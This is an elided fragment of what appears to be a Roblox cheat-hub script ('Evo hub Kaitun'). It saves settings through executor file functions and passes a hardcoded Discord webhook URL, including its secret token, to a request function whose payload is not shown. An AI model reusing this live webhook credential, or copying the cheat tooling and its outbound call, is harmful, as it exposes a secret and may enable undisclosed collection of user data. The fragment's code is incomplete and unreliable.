...
local d =
    b(
    {
        Url = "https://discord.com/api/webhooks/1135566298382868572/Ov-mDFEfiVnJ8Mib2we-lbSraHTZycK2QTBlK-rmaswCHrc3TLbhicTYC_yu7LD38LOl"
    }
)
function CheckSea(e)
...
function SaveSettings2()
    local HttpService = game:GetService("HttpService")
    if not isfolder("Evo hub Kaitun") then
        makefolder("Evo hub Kaitun")
    end
    writefile("Evo hub Kaitun/" .. bN, HttpService:JSONEncode(bM))
end
function ReadSetting2()
    local s, o =
        ...
        function()
            ...
            return HttpService:JSONDecode(readfile("Evo hub Kaitun/" .. bN))
        end
    )
    if s then
        return o
